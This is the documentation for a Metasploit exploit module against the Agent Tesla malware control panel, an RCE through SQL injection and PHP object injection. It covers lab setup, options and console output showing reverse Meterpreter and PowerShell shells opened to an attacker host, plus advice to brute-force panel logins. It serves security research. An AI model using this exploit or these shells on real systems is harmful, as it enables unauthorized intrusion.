## Vulnerable Application

### Description

This module exploits a command injection vulnerability within the control center of Agent Tesla versions XXX to XXX (was this ever patched?). Attackers can turn this vulnerability into an RCE can be obtained by exploiting two vulnerabilities (SQLi + PHP Object Injection) that occur within the `WebPanel/server_side/scripts/server_processing.php` file.

Note that due to additional security updates that were made to the Agent Tesla panel on September 12th 2018, any web panel versions released on or after this date will require authentication in order for the attacker to gain RCE. The code which was introduced can be seen in the snippet below:

```
session_start();
  if (!isset($_SESSION['logged_in'])
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
  }
```

**NOTE:**

Using [CyberCrime Tracker](https://cybercrime-tracker.net/), it was possible to locate several Agent Tesla web panels available for download. As there are no version numbers displayed in the Agent Tesla control center, it was hard to identify exactly which releases were available for download. However it is possible to perform some level of version identification by using the dates/times of the files contained in the `zip` archives to evaluate how recent/old a particular release is. From the file timestamps, the following versions were determined to be available via [CyberCrime Tracker](https://cybercrime-tracker.net/):

[WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) -Released in 2017- (unauthenticated RCE), source code protected by `ioncube`.

 * Tested on Windows 7 x64 with WAMP server 3.2.0 x64 and PHP version 5.6.40.
 * Tested on Debian 9.9.0 with PHP version 5.6.40.

[WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) -Released in 2018- (authenticated RCE), source code protected by `ioncube`.

 * Tested on Windows 7 x64 with WAMP server 3.2.0 x64 and PHP version 7.2.18.
 * Tested on Debian 9.9.0 with PHP version 7.2.31.

[WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) -Released in 2019- (authenticated RCE), source code is not obfuscated, **don't need** `ioncube`.

 * Tested on Windows 7 x64 WAMP server 3.2.0 x64 and PHP version 5.6.40.
 * Tested on Debian 9.9.0 with PHP version 7.2.31.

### Setup

#### Using Windows

##### Install WAMP Server 3.2.0 on Windows 10 x64

1. Download the latest version of [WAMP Server](https://sourceforge.net/projects/wampserver/files/latest/download) and install it using the default settings.
2. Search for `Wamp` within the search bar and click on the result titled `Wampserver64`, or run `C:\\wamp64\\wampmanager.exe`.
3. Wait for the application to start, and then right click on the purple/green W within the tray and ***check*** `Wamp Settings > Allow VirtualHost local IP's others than 127.*`.
4. Open `c:/wamp64/bin/apache/apache2.4.41/conf/extra/httpd-vhosts.conf` and replace the line `Require local` with `Require all granted`.
5. Select PHP version 5.6.40 by selecting `PHP > Version > 5.6.40` (***left click*** on started application icon) and wait for the icon to go from brown to green again.
6. Browse to `http://127.0.0.1/phpmyadmin/` and log in with the username `root` and a blank password.
7. On the page `http://127.0.0.1/phpmyadmin/index.php`, find the list of databases on the left hand side of the page and click the `New` button above it.
8. Under the `Create database` section, set the database name to `tesla` and set the text type to `utf8_general_ci`. Then click the `Create` button.
9. Confirm the database was created, and afterwards log out of `PHPMyAdmin`.
9. Unzip one of the 7zip files. You should see a folder called `WebPanel` that is contained within. Copy this folder to `C:\wamp64\www`.
10. Delete the file at `C:\wamp\www\WebPanel\config.php` if it exists.
11. OPTIONAL: If using [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) or [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z), follow the directions to install `IornCube` in the [Installing Ioncube](#Installing Ioncube) section.
11. Browse to `http://127.0.0.1/WebPanel/logout.php` to ensure you are properly logged out and then browse to `http://127.0.0.1/WebPanel/setup.php`.
12. Set the `Database Host` field to `127.0.0.1`, the `MySql Username` field to `root`, leave the `MySql Password` field, set the `Database Name` field to `tesla` and set the `Username` and `Password` fields under `Login Informations` section to the username and password you would like to log into the web panel as.
13. Browse to `http://127.0.0.1/WebPanel/login.php` and confirm you can log into the web panel and view the main web panel itself. You should see a header titled `Dashboard` followed by some sections labeled `Computers`, `Keystrokes`, `Passwords` and `Screenshots` if the login succeeded.

#### Using Linux

##### Install LAMP (Apache, MySQL, PHP)

For this, you can use a Linux Debian 9.9.0 (Stretch) x86_x64 as sandboxing system.

1. Install LAMP (Apache, MySQL, PHP).

```bash
sudo apt-get install apache2 apache2-utils mariadb-server mariadb-client ca-certificates apt-transport-https

wget -q https://packages.sury.org/php/apt.gpg -O- | sudo apt-key add -
echo "deb https://packages.sury.org/php/ stretch main" | sudo tee /etc/apt/sources.list.d/php.list
sudo apt-get update

# For PHP 5.6.40:
sudo apt-get install php5.6 php5.6-cli php5.6-common php5.6-curl php5.6-mbstring php5.6-mysql php5.6-xml libapache2-mod-php5.6 php5.6-json php5.6-opcache php5.6-readline

# For PHP 7.2.31:
sudo apt-get install php7.2 php7.2-cli php7.2-common php7.2-curl php7.2-mbstring php7.2-mysql php7.2-xml libapache2-mod-php7.2 php7.2-json php7.2-opcache php7.2-readline

sudo mysql_secure_installation
```

2. Create a blank database for Agant Tesla web panel.

```
sudo mysql -u root -ppassword

CREATE DATABASE tesla;
CREATE USER 'user' IDENTIFIED BY 'password';
GRANT USAGE ON *.* TO 'user'@localhost IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON `tesla`.* TO 'user'@localhost;
FLUSH PRIVILEGES;
exit
```

#### Installing Ioncube

##### Windows

Follow [Install WAMP Server 3.2.0 on Windows 10 x64](#Setup) steps.

1. Download [ioncube loader wizard](https://www.ioncube.com/loader-wizard/loader-wizard.zip).
2. Make sure you have the proper version of PHP selected within `Wamp` for the WebPanel you want install before using `ioncube loader wizard`.

  * For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) you need PHP 5.6.40.
  * For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) you need PHP 7.2.18.

3. Uncompress `loader-wizard.zip` into your web root directory: `C:\Wamp64\www\`.
4. Go to http://localhost/loader-wizard/ioncube/loader-wizard.php and follow the installation instructions.


##### Linux

Follow [Install LAMP (Apache, MySQL, PHP)](#Setup) steps.

1. Download [ioncube loader wizard](https://www.ioncube.com/loader-wizard/loader-wizard.tgz).
2. Make sure you have a proper version of PHP installed for the WebPanel you wish to use before using the `ioncube loader wizard`.

* For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) you need PHP 5.6.40.
* For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) you need PHP 7.2.31.

3. Uncompress `loader-wizard.tgz` into your web root directory: `/var/www/html/`.
4. Go to http://localhost/ioncube/loader-wizard.php and follow the installation instructions.

## Verification Steps

Follow [Setup](#Setup) and [Scenarios](#Scenarios).

## Options

**PASSWORD**

The Agent Tesla CnC password to authenticate with (needed if you attempt an authenticated RCE).

**Proxies**

A proxy chain of format type:host:port[,type:host:port][...]. It's optional.

**RHOSTS**

The target IP address on which the control center responds.

**RPORT**

The target TCP port on which the control center responds. Default: 80

**SSL**

Negotiate SSL/TLS for outgoing connections. Default: false

**TARGETURI**

The base URI path of control center. Default: '/WebPanel'

**USERNAME**

The Agent Tesla CnC username to authenticate with (needed if you attempt an authenticated RCE).

**VHOST**

The target HTTP server virtual host.

## Targets

```
   Id  Name
   --  ----
   0   Automatic (Dropper)
   1   Unix (In-Memory)
   2   Windows (In-Memory)
```

## Scenarios

**IMPORTANT:** However, is possible of found a 2017 control center version which normally are supposed to be vulnerable to an unauthenticated RCE, which was manually patched by the bots master. In real life, if the unauthenticated attempt doesn't work try to guess the credentials by brute-forcing the panel authentication.

### Agent Tesla (panel < September 12 2018) Unauthenticated on Linux

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `run`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: linux
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .WxWf.php
[*] Sending stage (38247 bytes) to 192.168.1.25
[*] Meterpreter session 2 opened (192.168.1.13:4444 -> 192.168.1.25:43260) at 2019-09-04 14:44:07 +0400

meterpreter >
```

### Agent Tesla (panel >= September 12 2018) Authenticated on Linux

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `set USERNAME admin`
5. Do: `set PASSWORD password`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 1
target => 1
msf5 exploit(multi/http/agent_tesla_panel_rce) > set cmd whoami
cmd => whoami
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Sending cmd/unix/generic command payload
[!] Dumping command output in parsed json response
www-data
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/agent_tesla_panel_rce) >
```

### Agent Tesla (panel < September 12 2018) Unauthenticated on Windows

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `run`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set lhost 192.168.1.13
lhost => 192.168.1.13
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: windows
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .AUKU.php
[*] Sending stage (38247 bytes) to 192.168.1.21
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.21:1036) at 2019-09-04 01:24:12 +0400

meterpreter >
```

### Agent Tesla (panel >= September 12 2018) Authenticated on Windows

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS 192.168.1.21`
4. Do: `set USERNAME admin`
5. Do: `set PASSWORD password`

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 2
target => 2
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Sending cmd/windows/reverse_powershell command payload
[*] Command shell session 2 opened (192.168.1.13:4444 -> 192.168.1.21:1040) at 2019-09-04 01:28:55 +0400

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp64\www\WebPanel\server_side\scripts>whoami
nt authority\system

C:\wamp64\www\WebPanel\server_side\scripts>
```

## References

  1. <https://krebsonsecurity.com/2018/10/who-is-agent-tesla/>
  2. <https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources/>
  3. <https://www.exploit-db.com/exploits/47256>
  4. <https://www.pirates.re/agent-tesla-remote-command-execution-(fighting-the-webpanel)>
